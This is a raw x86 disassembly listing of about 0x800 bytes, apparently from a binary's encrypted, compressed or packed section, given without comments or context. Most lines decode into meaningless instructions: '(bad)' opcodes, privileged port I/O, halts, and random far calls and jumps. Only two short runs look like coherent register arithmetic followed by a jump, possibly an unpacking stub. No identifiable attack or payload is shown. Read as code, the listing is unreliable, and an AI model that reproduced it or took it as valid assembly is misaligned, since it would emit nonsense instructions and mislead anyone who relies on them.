  403b90:	sbb    al,0xf5
  403b92:	cwde   
  403b93:	lods   al,BYTE PTR ds:[esi]
  403b94:	push   ss
  403b95:	mov    eax,0xefeb942f
  403b9a:	hlt    
  403b9b:	ss aad 0x16
  403b9e:	inc    edx
  403b9f:	push   ebp
  403ba0:	pushf  
  403ba1:	jle    0x403b8e
  403ba3:	push   ecx
  403ba4:	xchg   ebx,eax
  403ba5:	mov    esi,0x5e5565af
  403baa:	mov    DWORD PTR [esi],eax
  403bac:	cs sub ecx,edx
  403baf:	sub    eax,0x4ff276f3
  403bb5:	mov    esp,0x43dd462c
  403bba:	cld    
  403bbb:	pop    esi
  403bbc:	sar    BYTE PTR [edx],cl
  403bbe:	and    BYTE PTR [edx],ah
  403bc0:	mov    ch,0x8c
  403bc2:	mov    edi,0x7e549670
  403bc7:	inc    BYTE PTR [ebx-0x12c67d4e]
  403bcd:	aaa    
  403bce:	aad    0x3c
  403bd0:	mov    esi,0x8e0a81a5
  403bd5:	scas   eax,DWORD PTR es:[edi]
  403bd6:	xchg   esi,eax
  403bd7:	push   es
  403bd8:	stos   DWORD PTR es:[edi],eax
  403bd9:	inc    ebp
  403bda:	das    
  403bdb:	cmp    DWORD PTR [eax-0x27],esp
  403bde:	pop    ecx
  403bdf:	repz and BYTE PTR [ebx-0x19],dh
  403be3:	add    edi,DWORD PTR [eax]
  403be5:	or     BYTE PTR [ebx-0x5fd1d60b],0x58
  403bec:	and    BYTE PTR [ecx+0x1d],al
  403bef:	iret   
  403bf0:	scas   eax,DWORD PTR es:[edi]
  403bf1:	xor    BYTE PTR [ebx+0x6066c850],dh
  403bf7:	dec    eax
  403bf8:	cli    
  403bf9:	test   eax,0x4c6af1a0
  403bfe:	xchg   esp,eax
  403bff:	ja     0x403c50
  403c01:	and    BYTE PTR [esi],ch
  403c03:	jno    0x403c3a
  403c05:	sub    al,0xd4
  403c07:	sub    ebp,DWORD PTR [ebx]
  403c09:	mov    cl,0x1e
  403c0b:	dec    esp
  403c0c:	adc    bh,ah
  403c0e:	(bad)  
  403c0f:	xor    edi,eax
  403c11:	jno    0x403bdf
  403c13:	call   0xbff2:0x1d3cec1
  403c1a:	mov    ds:0x4e495719,al
  403c1f:	addr16 sub al,0xd8
  403c22:	adc    eax,0x1d8c81df
  403c27:	xchg   edx,eax
  403c28:	xor    dl,BYTE PTR [eax]
  403c2a:	das    
  403c2b:	fwait
  403c2c:	push   ss
  403c2d:	daa    
  403c2e:	sub    dh,BYTE PTR [edi+0x5cb808b2]
  403c34:	pop    ebp
  403c35:	retf   
  403c36:	stos   DWORD PTR es:[edi],eax
  403c37:	das    
  403c38:	arpl   bx,sp
  403c3a:	push   es
  403c3b:	cmp    al,0x43
  403c3d:	sbb    esi,DWORD PTR [ebp+esi*8+0x37]
  403c41:	div    DWORD PTR [eax-0x38374b57]
  403c47:	inc    eax
  403c48:	xchg   edi,ebx
  403c4a:	je     0x403c3e
  403c4c:	pop    ebx
  403c4d:	xchg   edi,eax
  403c4e:	test   DWORD PTR [ebx],edi
  403c50:	mov    esp,0x1ded3405
  403c55:	pop    eax
  403c56:	ret    0xec82
  403c59:	sar    DWORD PTR [edx],0x2b
  403c5c:	in     eax,dx
  403c5d:	cld    
  403c5e:	adc    eax,0xd4e120a3
  403c63:	pop    es
  403c64:	pop    ebp
  403c65:	inc    esi
  403c66:	mov    al,ds:0x282b9f13
  403c6b:	add    bl,BYTE PTR [ebp-0x21a180d1]
  403c71:	dec    esp
  403c72:	fisubr WORD PTR [ebp-0x46]
  403c75:	xchg   ebx,eax
  403c76:	inc    eax
  403c77:	sub    DWORD PTR [edi-0x7],edi
  403c7a:	enter  0x8198,0x93
  403c7e:	test   al,0xc0
  403c80:	cmp    DWORD PTR [ecx+0x44483361],ecx
  403c86:	sbb    eax,0x3fcba085
  403c8b:	(bad)
  403c8e:	xchg   BYTE PTR [edx],bl
  403c90:	xor    cl,0x1b
  403c93:	bound  edi,QWORD PTR [ecx-0x67]
  403c96:	sbb    BYTE PTR [eax-0x77d7e78b],0x2a
  403c9d:	push   ss
  403c9e:	mov    eax,ds:0x20c4e283
  403ca3:	jle    0x403c7b
  403ca5:	ds pop esi
  403ca7:	lea    ebx,[edx-0x54]
  403caa:	pop    ebx
  403cab:	sub    bh,BYTE PTR [esi-0x41]
  403cae:	cmp    ebp,DWORD PTR [ebx]
  403cb0:	(bad)  
  403cb2:	pop    ecx
  403cb3:	xor    BYTE PTR [ebp+0x22ad3794],dl
  403cb9:	int    0xdf
  403cbb:	hlt    
  403cbc:	in     eax,dx
  403cbd:	jo     0x403c8f
  403cbf:	rcr    BYTE PTR [esi],0x84
  403cc2:	or     DWORD PTR [eax],eax
  403cc4:	sub    al,0x63
  403cc6:	xchg   ecx,eax
  403cc7:	mov    edx,0x81a52f96
  403ccc:	dec    edx
  403ccd:	std    
  403cce:	mov    ds:0x289d9359,al
  403cd3:	mov    dh,0x87
  403cd5:	adc    bl,cl
  403cd7:	fdivp  st(7),st
  403cd9:	xchg   ecx,eax
  403cda:	ret    
  403cdb:	xor    ah,BYTE PTR [ecx]
  403cdd:	stos   BYTE PTR es:[edi],al
  403cde:	out    0xad,al
  403ce0:	adc    DWORD PTR [edi-0x243689a7],esi
  403ce6:	push   ebx
  403ce7:	dec    ecx
  403ce8:	ins    DWORD PTR es:[edi],dx
  403ce9:	dec    edx
  403cea:	scas   eax,DWORD PTR es:[edi]
  403ceb:	aad    0x79
  403ced:	test   al,0xb
  403cef:	push   ebp
  403cf0:	js     0x403cfc
  403cf2:	jne    0x403d4a
  403cf4:	mov    al,ds:0xd2a0a73d
  403cf9:	mov    edx,0xc63819dc
  403cfe:	das    
  403cff:	in     eax,dx
  403d00:	dec    ebx
  403d01:	mov    cl,0x19
  403d03:	or     eax,0x13f4aed5
  403d08:	dec    eax
  403d09:	aad    0x70
  403d0b:	jl     0x403cda
  403d0d:	int3   
  403d0e:	pusha  
  403d0f:	or     DWORD PTR [ebx-0x47],ecx
  403d12:	pop    edi
  403d13:	mov    ebx,0x675e706e
  403d18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d19:	imul   esp,esp,0xd4d007a2
  403d1f:	test   al,0xa9
  403d21:	dec    esp
  403d22:	jp     0x403d0c
  403d24:	pop    ds
  403d25:	(bad)  
  403d26:	jecxz  0x403d9a
  403d28:	xor    ecx,ebx
  403d2a:	das    
  403d2b:	and    al,0x99
  403d2d:	push   0xffffffea
  403d2f:	jno    0x403ceb
  403d31:	aas    
  403d32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d33:	retf   
  403d34:	push   ss
  403d35:	ret    0xb4c3
  403d38:	mov    edi,0x146449dc
  403d3d:	mov    BYTE PTR [eax-0x71792db1],dl
  403d43:	outs   dx,BYTE PTR ds:[esi]
  403d44:	inc    ecx
  403d45:	inc    DWORD PTR [edi]
  403d47:	inc    ebp
  403d48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d49:	xchg   edx,eax
  403d4a:	lods   al,BYTE PTR ds:[esi]
  403d4b:	mov    edx,0xdcb8ba69
  403d50:	and    al,0xa0
  403d52:	ds add ah,al
  403d55:	repnz pop ebp
  403d57:	sahf   
  403d58:	sar    BYTE PTR [esi+0x2a39ddbe],cl
  403d5e:	and    ecx,DWORD PTR [edi-0x31]
  403d61:	nop
  403d62:	ss jb  0x403d1d
  403d65:	xor    al,0x1e
  403d67:	test   al,0x6b
  403d69:	xor    bh,BYTE PTR ds:0xc4cc449
  403d6f:	mov    dh,0xb8
  403d71:	adc    bh,bh
  403d73:	lds    edx,FWORD PTR [edi]
  403d75:	or     DWORD PTR [ecx-0x76efb6b7],eax
  403d7b:	or     bh,BYTE PTR [ebp+ebp*1+0x49]
  403d7f:	scas   al,BYTE PTR es:[edi]
  403d80:	adc    dl,cl
  403d82:	aam    0xb5
  403d84:	mov    al,ds:0x37f6f205
  403d89:	mov    ebx,0x42f73630
  403d8e:	inc    esp
  403d8f:	ja     0x403d70
  403d91:	mov    fs,WORD PTR [ecx+0x3a3d9ae7]
  403d97:	sbb    BYTE PTR [esi-0x72],0x57
  403d9b:	sar    DWORD PTR [ecx],1
  403d9d:	dec    esp
  403d9e:	in     eax,dx
  403d9f:	shr    ecx,0x66
  403da2:	in     eax,0x4e
  403da4:	pop    eax
  403da5:	loopne 0x403dee
  403da7:	adc    al,0x58
  403da9:	stos   BYTE PTR es:[edi],al
  403daa:	and    esi,DWORD PTR [esi-0x569f61c]
  403db0:	in     al,0xe0
  403db2:	mov    bh,BYTE PTR [edi-0x26236201]
  403db8:	adc    DWORD PTR [edx-0x40f6bae5],eax
  403dbe:	test   al,0xe3
  403dc0:	adc    BYTE PTR [edx+edi*8],ah
  403dc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403dc4:	in     al,dx
  403dc5:	test   BYTE PTR [eax+0x61470a3b],bh
  403dcb:	adc    BYTE PTR [esi],0xa6
  403dce:	push   edi
  403dcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403dd0:	or     DWORD PTR [ecx],esp
  403dd2:	adc    al,0x72
  403dd4:	mov    ds:0x76e020c6,eax
  403dd9:	aad    0xe3
  403ddb:	arpl   sp,dx
  403ddd:	call   0xb852de96
  403de2:	scas   eax,DWORD PTR es:[edi]
  403de3:	je     0x403dea
  403de5:	leave  
  403de6:	add    BYTE PTR [esp+esi*4-0x56b64e36],cl
  403ded:	pop    ss
  403dee:	repnz faddp st(2),st
  403df1:	sub    DWORD PTR [ecx-0x67],eax
  403df4:	mov    ds:0x37db79f5,eax
  403df9:	dec    ebp
  403dfa:	rol    DWORD PTR [ebx+0xf03d6ca],cl
  403e00:	jp     0x403e67
  403e02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e03:	pcmpeqb mm7,QWORD PTR [eax+0x16]
  403e07:	ret    0xfb1
  403e0a:	pop    esi
  403e0b:	pop    edi
  403e0c:	(bad)  
  403e0d:	ins    DWORD PTR es:[edi],dx
  403e0e:	or     DWORD PTR [ecx-0x5835eb8b],esi
  403e14:	rol    BYTE PTR [edx+0x5c6594fa],1
  403e1a:	fwait
  403e1b:	push   0x13cdb4a9
  403e20:	sahf   
  403e21:	call   0xa8c2ecdd
  403e26:	les    edi,FWORD PTR [eax+0x113115d]
  403e2c:	mov    ?,WORD PTR [edx]
  403e2e:	xor    BYTE PTR [eax],0x6d
  403e31:	push   cs
  403e32:	xor    ah,al
  403e34:	test   eax,0x3e4b31a
  403e39:	sbb    eax,0x9be371d8
  403e3e:	xchg   edi,eax
  403e3f:	enter  0x2b4d,0xa9
  403e43:	and    esp,DWORD PTR ds:0x8818fad4
  403e49:	xor    eax,0x52a39c3b
  403e4e:	inc    ebp
  403e4f:	mov    ecx,es
  403e51:	cmc    
  403e52:	mov    WORD PTR [ecx],ds
  403e54:	mov    bh,0xc6
  403e56:	loop   0x403e94
  403e58:	sub    al,0xee
  403e5a:	inc    BYTE PTR [ecx]
  403e5c:	dec    edi
  403e5d:	dec    ebp
  403e5e:	sub    ah,BYTE PTR ds:0x62b02bb3
  403e64:	push   ds
  403e65:	imul   edi,DWORD PTR [ecx],0x2001b3c7
  403e6b:	jns    0x403e5a
  403e6d:	mov    BYTE PTR [esi],0x71
  403e70:	push   ss
  403e71:	sbb    ebx,DWORD PTR [eax-0x4]
  403e74:	(bad)  
  403e76:	inc    esi
  403e77:	sbb    ah,BYTE PTR [esi+0x49]
  403e7a:	xchg   DWORD PTR [ecx+esi*2+0x5a4a54ef],esp
  403e81:	lock dec eax
  403e83:	mov    cl,0xce
  403e85:	or     ebp,DWORD PTR [esi-0x55]
  403e88:	out    0x1b,al
  403e8a:	popa   
  403e8b:	push   eax
  403e8c:	xor    ebx,0xbb54c574
  403e92:	in     eax,dx
  403e93:	les    edi,FWORD PTR [ebx+eax*1]
  403e96:	xlat   BYTE PTR ds:[ebx]
  403e97:	or     al,0x1a
  403e99:	jge    0x403f0f
  403e9b:	ficom  DWORD PTR [ecx-0x52d6090a]
  403ea1:	(bad)  
  403ea2:	or     al,0xd8
  403ea4:	dec    esp
  403ea5:	icebp  
  403ea6:	jno    0x403ecd
  403ea8:	std    
  403ea9:	pop    eax
  403eaa:	push   edi
  403eab:	repnz xor BYTE PTR [ecx+0x75],dl
  403eaf:	out    0xe1,eax
  403eb1:	and    DWORD PTR [esi-0x34e2bdcc],0xffffffde
  403eb8:	mov    eax,ds:0x4f98942d
  403ebd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ebe:	adc    DWORD PTR [ecx-0x60],ebx
  403ec1:	shl    BYTE PTR ds:[esp+edi*4],0x30
  403ec6:	and    BYTE PTR [eax+0x62],cl
  403ec9:	inc    edi
  403eca:	out    0x8c,eax
  403ecc:	lock fwait
  403ece:	pop    es
  403ecf:	jno    0x403ea0
  403ed1:	aas    
  403ed2:	sub    esi,DWORD PTR [edi-0x59c6b70d]
  403ed8:	dec    edi
  403ed9:	lahf   
  403eda:	dec    edi
  403edb:	push   edi
  403edc:	cmp    eax,0x2b8e8bc3
  403ee1:	add    DWORD PTR [ecx-0x74],eax
  403ee4:	rol    BYTE PTR [ecx-0x7de2b3e8],0xc7
  403eeb:	dec    ebx
  403eec:	in     al,0x7f
  403eee:	ret    
  403eef:	adc    ebp,ebx
  403ef1:	mov    ch,0x3
  403ef3:	adc    dl,BYTE PTR [eax+0x5]
  403ef6:	in     al,dx
  403ef7:	mov    ah,0x28
  403ef9:	cmp    DWORD PTR [ebx+0x50],ebp
  403efc:	ffree  st(4)
  403efe:	std    
  403eff:	add    eax,esi
  403f01:	out    0x5e,eax
  403f03:	addr16 es into 
  403f06:	scas   eax,DWORD PTR es:[edi]
  403f07:	pop    ebp
  403f08:	sub    al,0xcc
  403f0a:	fld    DWORD PTR [ebx]
  403f0c:	add    DWORD PTR [ecx],ebx
  403f0e:	sbb    eax,0x42816f
  403f13:	mov    DWORD PTR [ebp-0x14],eax
  403f16:	mov    ecx,DWORD PTR [ebx]
  403f18:	mov    eax,DWORD PTR [ebx+0x4]
  403f1b:	mov    edx,DWORD PTR ds:0x4281ef
  403f21:	mov    edx,DWORD PTR [edx]
  403f23:	add    DWORD PTR ds:0x42837b,edx
  403f29:	shrd   ecx,eax,0x2
  403f2d:	sub    edx,0x9bd
  403f33:	shr    eax,0x2
  403f36:	and    eax,eax
  403f38:	mov    eax,DWORD PTR [ebx]
  403f3a:	and    DWORD PTR ds:0x428237,0x5c10
  403f44:	jmp    0x404322
  403f49:	sub    DWORD PTR [ecx-0x65e52424],0xffffff82
  403f50:	and    esi,esi
  403f52:	sbb    BYTE PTR [ecx-0x4cd6db44],ch
  403f58:	jl     0x403f28
  403f5a:	xlat   BYTE PTR ds:[ebx]
  403f5b:	sbb    BYTE PTR [eax],bl
  403f5d:	sahf   
  403f5e:	adc    bl,BYTE PTR [eax]
  403f60:	sbb    BYTE PTR [edi-0x581f7de1],cl
  403f66:	xchg   ecx,eax
  403f67:	test   DWORD PTR [esi+0x37],0xb9a41d71
  403f6e:	mov    edi,DWORD PTR [edx-0x395f623]
  403f74:	xor    esp,DWORD PTR [edx-0x6c]
  403f77:	and    cl,BYTE PTR [ebx+eiz*8-0x45]
  403f7b:	cli    
  403f7c:	sbb    DWORD PTR [edi+eax*1-0x583efbef],0x3e52b207
  403f87:	ja     0x403fde
  403f89:	inc    eax
  403f8a:	retf   
  403f8b:	sub    ah,ah
  403f8d:	lods   al,BYTE PTR ds:[esi]
  403f8e:	inc    ebx
  403f8f:	mov    cl,BYTE PTR ss:[edx-0x6c48672d]
  403f96:	loope  0x403f3a
  403f98:	mov    cs,WORD PTR [esi]
  403f9a:	jge    0x403fa3
  403f9c:	les    ebp,FWORD PTR [eax-0x23e9e703]
  403fa2:	add    BYTE PTR [edi+0x518f5c13],ah
  403fa8:	mov    eax,0x8428f0e4
  403fad:	lods   al,BYTE PTR ds:[esi]
  403fae:	test   eax,0xab5a23b5
  403fb3:	mov    gs,WORD PTR [edi+0x3d]
  403fb6:	mov    edi,0xdca06579
  403fbb:	fistp  WORD PTR [eax+0x6d]
  403fbe:	push   ebx
  403fbf:	addps  xmm1,XMMWORD PTR ds:0x57234ff5
  403fc6:	and    al,0x73
  403fc8:	outs   dx,DWORD PTR es:[esi]
  403fca:	in     eax,dx
  403fcb:	imul   DWORD PTR [ebx-0x3e]
  403fce:	jg     0x403f9b
  403fd0:	xchg   ebx,eax
  403fd1:	out    dx,al
  403fd2:	xchg   dl,bh
  403fd4:	jmp    DWORD PTR [edx]
  403fd6:	xchg   edx,eax
  403fd7:	pop    es
  403fd8:	jle    0x404023
  403fda:	adc    al,0x5b
  403fdc:	arpl   WORD PTR [eax],bp
  403fde:	fsub   DWORD PTR [ebx-0x6ada27a5]
  403fe4:	fwait
  403fe5:	cdq    
  403fe6:	in     eax,0xe
  403fe8:	and    DWORD PTR [edx-0x12dfcbad],0xffffffac
  403fef:	push   0xffffffab
  403ff1:	ud2    
  403ff3:	jmp    0xa234:0x3862597
  403ffa:	pop    ss
  403ffb:	inc    edi
  403ffc:	sbb    BYTE PTR [eax+ecx*2],0x1d
  404000:	imul   esi,DWORD PTR [ebp+0x2d7622d2],0x81d049f3
  40400a:	aaa    
  40400b:	xchg   edx,eax
  40400c:	or     al,0xa0
  40400e:	fnsave [edi]
  404010:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404011:	int3   
  404012:	cmp    al,0xf8
  404014:	shl    dl,1
  404016:	jne    0x404004
  404018:	bound  eax,QWORD PTR [edi+0x35e14148]
  40401e:	sbb    BYTE PTR [eax],0x4b
  404021:	cli    
  404022:	and    BYTE PTR [ebx+0xa1e64da],bl
  404028:	loopne 0x403fe5
  40402a:	mov    dh,0x61
  40402c:	ror    DWORD PTR [ebp-0x4f197e52],cl
  404032:	dec    eax
  404033:	ret    0xfe0c
  404036:	dec    esi
  404037:	out    dx,al
  404038:	in     eax,dx
  404039:	stc    
  40403a:	sbb    eax,0xed3458e4
  40403f:	pop    ecx
  404040:	rcr    DWORD PTR [esi-0x5855a12b],1
  404046:	leave  
  404047:	lahf   
  404048:	add    DWORD PTR [eax+0x6a041a1e],0xffffff81
  40404f:	inc    ebx
  404050:	xchg   edi,eax
  404051:	sub    ebx,DWORD PTR [ebx-0x1c4d3f13]
  404057:	add    bl,BYTE PTR [ecx+edx*1]
  40405a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40405b:	inc    ebx
  40405c:	into   
  40405d:	add    BYTE PTR [ebp-0x2e2670e5],al
  404063:	inc    ebx
  404064:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404065:	add    BYTE PTR [esi],cl
  404067:	retf   0xcb1c
  40406a:	sbb    DWORD PTR [ecx+ebx*8+0x51865036],0xffffffd3
  404072:	loope  0x404018
  404074:	and    ecx,ebp
  404076:	jp     0x4040f6
  404078:	int    0xa4
  40407a:	cmp    dl,al
  40407c:	pop    edi
  40407d:	and    al,0x10
  40407f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404080:	mov    dh,al
  404082:	daa    
  404083:	retf   0xbfae
  404086:	mov    ah,0x85
  404088:	xchg   esp,eax
  404089:	cmp    eax,0x4492cc51
  40408e:	outs   dx,BYTE PTR ds:[esi]
  40408f:	mov    DWORD PTR [ecx+0x6e8501ec],ecx
  404095:	sbb    eax,0x42c94290
  40409a:	repnz iret 
  40409c:	xor    DWORD PTR [ebx-0x4e7d3f22],eax
  4040a2:	mov    bh,0x66
  4040a4:	call   0xf194:0x6332f238
  4040ab:	add    al,0xab
  4040ad:	jecxz  0x40407f
  4040af:	dec    ecx
  4040b0:	fadd   QWORD PTR [ebx]
  4040b2:	rol    BYTE PTR ds:0xc13bdb8b,cl
  4040b8:	add    DWORD PTR [esi-0x29aac311],esp
  4040be:	and    eax,DWORD PTR [eax+0x16]
  4040c1:	jl     0x40413d
  4040c3:	nop
  4040c4:	and    DWORD PTR [ebx+esi*1],0x44a7a8d1
  4040cb:	setl   BYTE PTR [edx+0x65]
  4040cf:	cmp    BYTE PTR ds:0x3404dd1f,al
  4040d5:	jb     0x404141
  4040d7:	jae    0x404079
  4040d9:	fistp  DWORD PTR [edi-0x4bf55366]
  4040df:	xchg   edi,eax
  4040e0:	fistp  WORD PTR ds:0x2dbfdc34
  4040e6:	in     al,dx
  4040e7:	(bad)  
  4040e8:	popa   
  4040e9:	je     0x40411a
  4040eb:	cmc    
  4040ec:	div    DWORD PTR ss:[ecx+0x5b8afa37]
  4040f3:	ficom  DWORD PTR [esi]
  4040f5:	cmp    DWORD PTR [ebx*4-0x5f651541],edx
  4040fc:	jg     0x4040a9
  4040fe:	(bad)  
  4040ff:	stos   BYTE PTR es:[edi],al
  404100:	sbb    ch,BYTE PTR [esi+0x79]
  404103:	xor    edi,eax
  404105:	jge    0x4040d0
  404107:	je     0x40411b
  404109:	mov    ch,0x41
  40410b:	cmp    DWORD PTR [ebp+0x1a],eax
  40410e:	xchg   BYTE PTR [esi-0x760630c4],dl
  404114:	or     ebx,DWORD PTR [eax]
  404116:	and    WORD PTR [edx],bx
  404119:	test   DWORD PTR [edx],0xb641778e
  40411f:	xor    eax,0xd6094826
  404124:	inc    ecx
  404125:	jnp    0x404184
  404127:	addr16 pop ds
  404129:	pop    ebx
  40412a:	dec    eax
  40412b:	rcl    BYTE PTR [ebp-0xc3711b8],0x9a
  404132:	rcl    BYTE PTR [edx-0x47a0614f],0x7c
  404139:	jbe    0x404184
  40413b:	int    0xa9
  40413d:	stos   BYTE PTR es:[edi],al
  40413e:	popf   
  40413f:	jle    0x4040ef
  404141:	and    eax,0x274f7d2f
  404146:	pop    ss
  404147:	fidiv  WORD PTR [ebp-0x635ae3bd]
  40414d:	and    ah,BYTE PTR [ebx-0x65]
  404150:	std    
  404151:	adc    al,0xb4
  404153:	pop    eax
  404154:	(bad)  [eax+0x74]
  404157:	jno    0x404178
  404159:	inc    ebx
  40415a:	mov    BYTE PTR [edi+ebp*1+0x3a],ah
  40415e:	mov    WORD PTR [ecx],gs
  404160:	div    DWORD PTR [ebp+0x9]
  404163:	sbb    BYTE PTR cs:[eax+0x55],0xc1
  404168:	fldenv [eax-0x354ca150]
  40416e:	cwde   
  40416f:	and    eax,0x34e3c9a
  404174:	push   es
  404175:	loopne 0x4041dc
  404177:	dec    ebx
  404178:	jae    0x4041b0
  40417a:	or     DWORD PTR [esi],edx
  40417c:	scas   eax,DWORD PTR es:[edi]
  40417d:	aam    0x27
  40417f:	jae    0x4041d9
  404181:	ret    0x21c7
  404184:	adc    esp,edi
  404186:	icebp  
  404187:	inc    eax
  404188:	sbb    edi,ecx
  40418a:	mov    dh,0x31
  40418c:	xchg   ecx,eax
  40418d:	dec    edi
  40418e:	jecxz  0x4041a7
  404190:	pop    edx
  404191:	fnstsw WORD PTR [edx+eax*1+0x19]
  404195:	mov    esi,0x4f529cb3
  40419a:	jo     0x404176
  40419c:	sub    eax,DWORD PTR [ecx-0x43]
  40419f:	ins    BYTE PTR es:[edi],dx
  4041a0:	push   ebx
  4041a1:	mov    ecx,?
  4041a3:	cli    
  4041a4:	cwde   
  4041a5:	test   al,0xdb
  4041a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041a8:	icebp  
  4041a9:	popf   
  4041aa:	xor    eax,0xd43fb8bf
  4041af:	fiadd  DWORD PTR [ebx+eiz*1-0x4d110bcf]
  4041b6:	xchg   esp,eax
  4041b7:	push   edx
  4041b8:	test   eax,0xda3322c2
  4041bd:	xchg   BYTE PTR [ebx-0x52],ah
  4041c0:	retf   
  4041c1:	call   0xddae:0xf57e8450
  4041c8:	pop    ds
  4041c9:	cmp    edx,DWORD PTR [ebp+0x34]
  4041cc:	aam    0x92
  4041ce:	mov    DWORD PTR [ebx+0x7a],ebp
  4041d1:	push   ebp
  4041d2:	not    al
  4041d4:	jb     0x40419f
  4041d6:	mov    ebp,0x3bf2317c
  4041db:	xchg   esp,eax
  4041dc:	inc    ecx
  4041dd:	cs in  al,0x1c
  4041e0:	aad    0x77
  4041e2:	cld    
  4041e3:	inc    ebx
  4041e4:	repnz add al,0x66
  4041e7:	dec    ebx
  4041e8:	in     eax,dx
  4041e9:	mov    eax,ds:0xcb6497a7
  4041ee:	jns    0x40420e
  4041f0:	or     BYTE PTR [ebp+0x33],dl
  4041f3:	sti    
  4041f4:	adc    BYTE PTR [ebx],cl
  4041f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041f8:	adc    dl,BYTE PTR [edi+ebp*8-0x64ae0879]
  4041ff:	test   eax,0xdceaa410
  404204:	cli    
  404205:	jge    0x4041a5
  404207:	shr    dl,cl
  404209:	div    BYTE PTR [ebp-0x364f679d]
  40420f:	mov    ds:0x18290aa6,eax
  404214:	bound  edi,QWORD PTR [ecx]
  404216:	out    dx,eax
  404217:	push   0x740b9e44
  40421c:	addr16 std 
  40421e:	adc    esp,DWORD PTR [esi+0x6e3da479]
  404224:	lea    ebx,[ecx]
  404226:	mov    eax,ds:0xddc7191f
  40422b:	sub    bl,BYTE PTR [eax-0x5474ad6d]
  404231:	aas    
  404232:	into   
  404233:	rcl    BYTE PTR [ebx-0x74],1
  404236:	dec    eax
  404237:	push   ss
  404238:	push   0x7955baf3
  40423d:	fwait
  40423e:	(bad)  
  40423f:	and    al,0x5c
  404241:	add    esp,ebx
  404243:	pop    ds
  404244:	loope  0x404293
  404246:	enter  0xb6ea,0x2c
  40424a:	loope  0x404200
  40424c:	mov    ch,0xe2
  40424e:	test   edi,edx
  404250:	call   0x29aa:0xddbde9d5
  404257:	mov    al,ds:0x46f4c487
  40425c:	push   ebx
  40425d:	arpl   dx,si
  40425f:	call   0x3fd79d97
  404264:	sub    BYTE PTR [edx-0x75],dl
  404267:	scas   al,BYTE PTR es:[edi]
  404268:	ret    0x5b8e
  40426b:	jns    0x40428e
  40426d:	pop    edi
  40426e:	daa    
  40426f:	in     eax,0x1d
  404271:	jmp    0x73dc:0xb0564016
  404278:	das    
  404279:	call   0x272a:0xaba86f2d
  404280:	push   0xf8cf706f
  404285:	aad    0xd9
  404287:	sub    al,0xb5
  404289:	jnp    0x404255
  40428b:	pcmpgtw mm7,QWORD PTR [edi-0x7a]
  40428f:	inc    ebp
  404290:	add    eax,edi
  404292:	out    dx,al
  404293:	imul   eax,DWORD PTR [ecx+0x2b38fed4],0xde775d59
  40429d:	repnz in eax,dx
  40429f:	cld    
  4042a0:	xor    DWORD PTR [edi-0x43],ebp
  4042a3:	mov    bh,0x3b
  4042a5:	stos   DWORD PTR es:[edi],eax
  4042a6:	jmp    0x68ae:0x5233d075
  4042ad:	mov    edi,0xeb6e4c54
  4042b2:	mov    al,ds:0x378a1a20
  4042b7:	or     DWORD PTR [edi],esi
  4042b9:	into   
  4042ba:	pop    esp
  4042bb:	xor    esi,esi
  4042bd:	retf   
  4042be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042bf:	sub    cl,ch
  4042c1:	push   eax
  4042c2:	mov    al,0x64
  4042c4:	scas   al,BYTE PTR es:[edi]
  4042c5:	in     eax,0x6f
  4042c7:	test   DWORD PTR [ebp-0x132fc919],0x4a163fc3
  4042d1:	xchg   DWORD PTR [esi-0x5a4c8a3f],esi
  4042d7:	test   DWORD PTR [eax+0x75b44c0d],edi
  4042dd:	enter  0xed09,0x42
  4042e1:	jno    0x4042e3
  4042e3:	pop    ecx
  4042e4:	sub    eax,0x53c03589
  4042e9:	mov    esi,0x5b7e27a3
  4042ee:	nop
  4042ef:	loop   0x404318
  4042f1:	shl    bh,cl
  4042f3:	dec    BYTE PTR [edx-0x3b]
  4042f6:	ins    BYTE PTR es:[edi],dx
  4042f7:	adc    eax,DWORD PTR [ebp+0x12]
  4042fa:	aas    
  4042fb:	inc    ebp
  4042fc:	in     al,dx
  4042fd:	dec    edi
  4042fe:	or     ecx,DWORD PTR [edi]
  404300:	in     eax,dx
  404301:	cmp    al,0x78
  404303:	and    eax,0x60c90daa
  404308:	int3   
  404309:	jmp    0x4e58e1b1
  40430e:	sbb    al,0x2f
  404310:	addr16 push 0xedafc8fe
  404316:	pop    eax
  404317:	pop    esi
  404318:	xchg   edx,eax
  404319:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40431a:	leave  
  40431b:	or     eax,DWORD PTR [eax]
  40431d:	aas    
  40431e:	sbb    BYTE PTR [edi],bh
  404320:	add    BYTE PTR [edx-0x75],cl
  404323:	push   ebx
  404324:	add    al,0x21
  404326:	sbb    eax,0x42823b
  40432b:	xor    ecx,edi
  40432d:	or     edx,DWORD PTR ds:0x42826b
  404333:	shl    eax,0x1e
  404336:	and    edx,DWORD PTR ds:0x4282e7
  40433c:	xor    eax,eax
  40433e:	mov    edx,DWORD PTR ds:0x428227
  404344:	and    DWORD PTR ds:0x428387,edx
  40434a:	or     eax,ecx
  40434c:	mov    ecx,DWORD PTR [ebx]
  40434e:	movzx  edx,BYTE PTR ds:0x42836f
  404355:	sbb    DWORD PTR ds:0x42827b,edx
  40435b:	mov    edx,DWORD PTR [ebx+0x4]
  40435e:	jmp    0x40473c
  404363:	xchg   BYTE PTR [eax+ebp*4],ch
  404366:	xchg   edx,eax
  404367:	call   0x1412:0x951c227a
  40436e:	stos   BYTE PTR es:[edi],al
  40436f:	sahf   
  404370:	pop    esi
  404371:	xchg   DWORD PTR [ebp+edx*2-0x31],edi
  404375:	sbb    BYTE PTR [eax],bl
  404377:	sahf   
  404378:	adc    bl,BYTE PTR [eax]
  40437a:	sbb    BYTE PTR [edi+0x48],ah
